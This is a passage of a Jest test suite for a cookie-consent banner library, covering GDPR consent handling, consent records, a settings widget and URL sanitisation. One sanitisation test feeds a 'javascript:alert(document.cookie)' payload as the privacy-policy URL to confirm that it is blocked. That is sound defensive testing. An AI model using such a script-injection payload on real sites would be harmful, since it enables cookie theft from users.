        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        const settingsBtn = document.getElementById('cks');
        const el = document.getElementById('ckb');

        expect(el?.classList.contains('expanded')).toBe(false);
        settingsBtn?.click();
        expect(el?.classList.contains('expanded')).toBe(true);
      });

      it('shows save button and hides settings when expanded', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        const settingsBtn = document.getElementById('cks');
        const saveBtn = document.getElementById('cksv');

        settingsBtn?.click();
        expect(saveBtn?.style.display).not.toBe('none');
        expect(settingsBtn?.style.display).toBe('none');
      });
    });

    describe('GDPR consent handling', () => {
      it('Accept All sets all categories to true', () => {
        const onConsent = jest.fn();
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true, onConsent });
        banner.show();
        document.getElementById('cky')?.click();

        expect(onConsent).toHaveBeenCalled();
        const consent = onConsent.mock.calls[0][0] as ConsentState;
        expect(consent.essential).toBe(true);
        expect(consent.analytics).toBe(true);
        expect(consent.marketing).toBe(true);
        expect(consent.functional).toBe(true);
      });

      it('Reject All sets non-required categories to false', () => {
        const onConsent = jest.fn();
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true, onConsent });
        banner.show();
        document.getElementById('ckn')?.click();

        expect(onConsent).toHaveBeenCalled();
        const consent = onConsent.mock.calls[0][0] as ConsentState;
        expect(consent.essential).toBe(true); // Required stays true
        expect(consent.analytics).toBe(false);
        expect(consent.marketing).toBe(false);
        expect(consent.functional).toBe(false);
      });

      it('Save Preferences saves checkbox states', () => {
        const onConsent = jest.fn();
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true, onConsent });
        banner.show();

        // Expand settings
        document.getElementById('cks')?.click();

        // Check only analytics
        const analyticsCheckbox = document.querySelector('input[value="analytics"]') as HTMLInputElement;
        analyticsCheckbox.checked = true;

        // Uncheck marketing
        const marketingCheckbox = document.querySelector('input[value="marketing"]') as HTMLInputElement;
        marketingCheckbox.checked = false;

        // Save
        document.getElementById('cksv')?.click();

        expect(onConsent).toHaveBeenCalled();
        const consent = onConsent.mock.calls[0][0] as ConsentState;
        expect(consent.analytics).toBe(true);
        expect(consent.marketing).toBe(false);
      });

      it('stores granular consent in cookie', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        document.getElementById('cky')?.click();

        const cookieValue = getConsent();
        expect(cookieValue).toContain('essential:1');
        expect(cookieValue).toContain('analytics:1');
      });
    });

    describe('getConsent() and hasConsent()', () => {
      it('getConsent returns null before consent given', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        expect(banner.getConsent()).toBeNull();
      });

      it('getConsent returns consent state after accepting', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        banner.accept();

        const consent = banner.getConsent();
        expect(consent).not.toBeNull();
        expect(consent?.essential).toBe(true);
        expect(consent?.analytics).toBe(true);
      });

      it('hasConsent returns false before consent given', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        expect(banner.hasConsent('analytics')).toBe(false);
      });

      it('hasConsent returns correct value for category', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        banner.reject(); // Reject all

        expect(banner.hasConsent('essential')).toBe(true); // Required always true
        expect(banner.hasConsent('analytics')).toBe(false);
      });
    });

    describe('manage()', () => {
      it('shows banner even when consent exists', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.accept();
        expect(document.getElementById('ckb')).toBeNull();

        banner.manage();
        expect(document.getElementById('ckb')).not.toBeNull();
      });

      it('starts in expanded mode', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.accept();
        banner.manage();

        const el = document.getElementById('ckb');
        expect(el?.classList.contains('expanded')).toBe(true);
      });

      it('preserves previous consent state in checkboxes', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();

        // Expand and set specific consent
        document.getElementById('cks')?.click();
        const analyticsCheckbox = document.querySelector('input[value="analytics"]') as HTMLInputElement;
        analyticsCheckbox.checked = false;
        document.getElementById('cksv')?.click();

        // Reopen via manage()
        banner.manage();

        // Check that previous state is preserved
        const analyticsCheckbox2 = document.querySelector('input[value="analytics"]') as HTMLInputElement;
        expect(analyticsCheckbox2.checked).toBe(false);
      });
    });

    describe('GDPR with existing consent', () => {
      it('reads granular consent from cookie on init', () => {
        document.cookie = 'ck=essential:1,analytics:0,marketing:1,functional:0;path=/';
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });

        const consent = banner.getConsent();
        expect(consent?.essential).toBe(true);
        expect(consent?.analytics).toBe(false);
        expect(consent?.marketing).toBe(true);
        expect(consent?.functional).toBe(false);
      });

      it('reads legacy consent "1" as all accepted', () => {
        document.cookie = 'ck=1;path=/';
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });

        expect(banner.hasConsent('analytics')).toBe(true);
        expect(banner.hasConsent('marketing')).toBe(true);
      });
    });

    describe('onConsent callback error handling', () => {
      it('catches errors in onConsent callback', () => {
        const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          onConsent: () => {
            throw new Error('onConsent error');
          },
        });
        banner.show();

        expect(() => banner.accept()).not.toThrow();
        expect(consoleSpy).toHaveBeenCalled();

        consoleSpy.mockRestore();
      });
    });

    describe('GDPR without auto-accept', () => {
      beforeEach(() => {
        jest.useFakeTimers();
      });

      it('does not auto-accept in GDPR mode even for non-EU', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: false, autoAcceptDelay: 1000 });
        banner.show();
        jest.advanceTimersByTime(5000);
        expect(banner.status).toBeNull(); // No auto-accept in GDPR mode
      });

      it('does not auto-accept on scroll in GDPR mode', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: false });
        banner.show();
        document.dispatchEvent(new Event('scroll'));
        expect(banner.status).toBeNull(); // No auto-accept in GDPR mode
      });
    });

    describe('Custom categories', () => {
      it('uses custom categories when provided', () => {
        const customCategories: CookieCategory[] = [
          { id: 'necessary', name: 'Necessary', required: true },
          { id: 'preferences', name: 'Preferences' },
          { id: 'statistics', name: 'Statistics' },
        ];
        const banner = createCookieBanner({ categories: customCategories, forceEU: true });
        banner.show();

        const checkboxes = document.querySelectorAll('input[name="ckb-cat"]');
        expect(checkboxes.length).toBe(3);

        const values = Array.from(checkboxes).map(c => (c as HTMLInputElement).value);
        expect(values).toContain('necessary');
        expect(values).toContain('preferences');
        expect(values).toContain('statistics');
      });

      it('respects defaultEnabled for categories', () => {
        const customCategories: CookieCategory[] = [
          { id: 'essential', name: 'Essential', required: true },
          { id: 'analytics', name: 'Analytics', defaultEnabled: true },
          { id: 'marketing', name: 'Marketing', defaultEnabled: false },
        ];
        const banner = createCookieBanner({ categories: customCategories, forceEU: true });
        banner.show();

        const analyticsCheckbox = document.querySelector('input[value="analytics"]') as HTMLInputElement;
        const marketingCheckbox = document.querySelector('input[value="marketing"]') as HTMLInputElement;

        expect(analyticsCheckbox.checked).toBe(true);
        expect(marketingCheckbox.checked).toBe(false);
      });
    });
  });

  // ============================================================================
  // CONSENT RECORD & AUDIT TRAIL TESTS
  // ============================================================================
  describe('Consent Record & Audit Trail', () => {
    describe('getConsentRecord()', () => {
      it('returns null before consent is given', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        expect(banner.getConsentRecord()).toBeNull();
      });

      it('returns consent record with timestamp after accepting', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        banner.accept();

        const record = banner.getConsentRecord();
        expect(record).not.toBeNull();
        expect(record?.timestamp).toBeDefined();
        expect(new Date(record!.timestamp).getTime()).not.toBeNaN();
      });

      it('includes policy version when provided', () => {
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          policyVersion: '2.0',
        });
        banner.show();
        banner.accept();

        const record = banner.getConsentRecord();
        expect(record?.policyVersion).toBe('2.0');
      });

      it('records method as "banner" for initial consent', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        banner.accept();

        const record = banner.getConsentRecord();
        expect(record?.method).toBe('banner');
      });

      it('includes consent state in record', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        banner.accept();

        const record = banner.getConsentRecord();
        expect(record?.state.essential).toBe(true);
        expect(record?.state.analytics).toBe(true);
      });
    });

    describe('onConsent callback receives record', () => {
      it('passes consent record to onConsent callback', () => {
        const onConsent = jest.fn();
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          policyVersion: '1.5',
          onConsent,
        });
        banner.show();
        banner.accept();

        expect(onConsent).toHaveBeenCalledTimes(1);
        const record = onConsent.mock.calls[0][1] as ConsentRecord;
        expect(record.timestamp).toBeDefined();
        expect(record.policyVersion).toBe('1.5');
        expect(record.method).toBe('banner');
      });
    });
  });

  // ============================================================================
  // CONSENT WIDGET TESTS
  // ============================================================================
  describe('Consent Widget', () => {
    describe('widget configuration', () => {
      it('does not show widget by default', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        banner.accept();

        const widget = document.querySelector('[id^="ckb-widget"]');
        expect(widget).toBeNull();
      });

      it('shows widget after consent when enabled', () => {
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          widget: { enabled: true },
        });
        banner.show();
        banner.accept();

        const widget = document.querySelector('[id^="ckb-widget"]');
        expect(widget).not.toBeNull();
      });

      it('positions widget on bottom-left by default', () => {
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          widget: { enabled: true },
        });
        banner.show();
        banner.accept();

        const widget = document.querySelector('[id^="ckb-widget"]') as HTMLElement;
        // Browser may normalize to "left: 16px" with space
        expect(widget?.style.cssText).toMatch(/left:\s*16px/);
      });

      it('positions widget on bottom-right when configured', () => {
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          widget: { enabled: true, position: 'bottom-right' },
        });
        banner.show();
        banner.accept();

        const widget = document.querySelector('[id^="ckb-widget"]') as HTMLElement;
        // Browser may normalize to "right: 16px" with space
        expect(widget?.style.cssText).toMatch(/right:\s*16px/);
      });

      it('uses custom widget text', () => {
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          widget: { enabled: true, text: '⚙️' },
        });
        banner.show();
        banner.accept();

        const widget = document.querySelector('[id^="ckb-widget"]');
        expect(widget?.textContent).toBe('⚙️');
      });

      it('uses custom aria-label', () => {
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          widget: { enabled: true, ariaLabel: 'Cookie Settings' },
        });
        banner.show();
        banner.accept();

        const widget = document.querySelector('[id^="ckb-widget"]');
        expect(widget?.getAttribute('aria-label')).toBe('Cookie Settings');
      });
    });

    describe('showWidget() / hideWidget()', () => {
      it('showWidget creates widget programmatically', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        banner.accept();

        expect(document.querySelector('[id^="ckb-widget"]')).toBeNull();
        banner.showWidget();
        expect(document.querySelector('[id^="ckb-widget"]')).not.toBeNull();
      });

      it('hideWidget removes widget', () => {
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          widget: { enabled: true },
        });
        banner.show();
        banner.accept();

        expect(document.querySelector('[id^="ckb-widget"]')).not.toBeNull();
        banner.hideWidget();
        expect(document.querySelector('[id^="ckb-widget"]')).toBeNull();
      });

      it('does not create duplicate widgets', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        banner.accept();

        banner.showWidget();
        banner.showWidget();
        banner.showWidget();

        const widgets = document.querySelectorAll('[id^="ckb-widget"]');
        expect(widgets.length).toBe(1);
      });
    });

    describe('widget interaction', () => {
      it('clicking widget opens manage dialog', () => {
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          widget: { enabled: true },
        });
        banner.show();
        banner.accept();

        expect(document.getElementById('ckb')).toBeNull();

        const widget = document.querySelector('[id^="ckb-widget"]') as HTMLButtonElement;
        widget?.click();

        expect(document.getElementById('ckb')).not.toBeNull();
        expect(document.getElementById('ckb')?.classList.contains('expanded')).toBe(true);
      });

      it('records method as "widget" when consent changed via widget', () => {
        const onConsent = jest.fn();
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          widget: { enabled: true },
          onConsent,
        });
        banner.show();
        banner.accept();

        // Click widget to reopen
        const widget = document.querySelector('[id^="ckb-widget"]') as HTMLButtonElement;
        widget?.click();

        // Save new preferences
        document.getElementById('cksv')?.click();

        // Second call should have method 'widget'
        expect(onConsent).toHaveBeenCalledTimes(2);
        const record = onConsent.mock.calls[1][1] as ConsentRecord;
        expect(record.method).toBe('widget');
      });
    });

    describe('widget with existing consent', () => {
      it('shows widget on init when consent exists and widget enabled', () => {
        document.cookie = 'ck=essential:1,analytics:1;path=/';
        createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          widget: { enabled: true },
        });

        // Widget should be shown since consent already exists
        const widget = document.querySelector('[id^="ckb-widget"]');
        expect(widget).not.toBeNull();
      });
    });
  });

  // ============================================================================
  // PRIVACY POLICY URL SANITIZATION TESTS
  // ============================================================================
  describe('Privacy Policy URL Sanitization', () => {
    it('sanitizes javascript: URLs in privacyPolicyUrl', () => {
      const banner = createCookieBanner({
        mode: 'gdpr',
        forceEU: true,
        privacyPolicyUrl: 'javascript:alert(document.cookie)',
      });
      banner.show();

      const link = document.querySelector('#ckb a');
      // Link should not be rendered since URL is blocked
      expect(link).toBeNull();
    });

    it('allows valid https URLs in privacyPolicyUrl', () => {
      const banner = createCookieBanner({
        mode: 'gdpr',
        forceEU: true,
        privacyPolicyUrl: 'https://example.com/privacy',
      });
      banner.show();

      const link = document.querySelector('#ckb a[href="https://example.com/privacy"]');
      expect(link).not.toBeNull();
    });

    it('allows relative URLs in privacyPolicyUrl', () => {
      const banner = createCookieBanner({
        mode: 'gdpr',
        forceEU: true,
        privacyPolicyUrl: '/privacy-policy',
      });
      banner.show();

      const link = document.querySelector('#ckb a[href="/privacy-policy"]');
      expect(link).not.toBeNull();
    });
  });
});
